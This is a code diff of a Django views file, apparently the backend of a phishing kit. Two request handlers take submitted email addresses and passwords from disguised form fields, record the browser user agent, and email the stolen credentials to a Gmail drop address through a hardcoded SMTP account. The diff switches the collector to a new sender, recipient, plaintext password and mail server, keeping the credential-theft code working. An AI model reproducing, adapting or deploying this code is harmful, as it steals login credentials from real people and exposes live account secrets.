@@ -20,9 +20,9 @@ def addin(request):
     email = request.POST["powerioman"]
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "servermail@banserver.online"
-    receiver_email = "smdpsar@gmail.com"
-    password = "6]gdA!?Zzxjt"
+    sender_email = "mzubby@merusllc.com"
+    receiver_email = "mzubby52@gmail.com"
+    password = "$yK6KFRZb12"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API ... 0"
@@ -47,7 +47,7 @@ def addin(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("banserver.online", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
         return render(request, 'indexx.html', {'email': email, 'domains': domain})
@@ -57,9 +57,9 @@ def adddzz(request):
     email = request.POST["zzpowerman"]
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "servermail@banserver.online"
-    receiver_email = "smdpsar@gmail.com"
-    password = "6]gdA!?Zzxjt"
+    sender_email = "mzubby@merusllc.com"
+    receiver_email = "mzubby52@gmail.com"
+    password = "$yK6KFRZb12"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API --1"
@@ -84,7 +84,7 @@ def adddzz(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("banserver.online", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
     return render(request, 'Domain.html', {'domains': domain})
